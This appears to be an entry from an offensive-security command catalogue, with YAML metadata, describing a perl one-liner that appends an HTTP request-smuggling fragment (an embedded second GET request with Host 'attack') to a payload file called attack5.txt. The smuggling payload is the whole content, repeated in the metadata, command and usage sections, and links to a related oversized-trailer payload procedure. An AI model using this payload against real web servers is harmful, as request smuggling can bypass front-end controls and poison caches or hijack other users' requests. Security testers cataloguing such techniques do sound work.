---
data: >-
  perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost:
  attack\r\n\r\n"' >> attack5.txt
tags:
  - payload
type: command
executor: bash
platforms:
  - Linux
id: 27ef718d-9176-4ae5-b4d6-8664eb1e3bf6
created_at: '2025-12-13T09:01:22.325Z'
updated_at: '2025-12-13T09:01:22.325Z'
verified: false
validated: true
submitted: true
---
# Perl Append Smuggled Request

## Command

```bash
perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
```

## Description

Appends a smuggled GET request to attack5.txt using Perl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Execute the following Perl code | Yes |

## Examples

### Basic Usage

```bash
perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
```

## Expected Output

attack5.txt appended with smuggled request.

## Related

- [[procedures/Craft-Oversized-Trailer-Payload]]
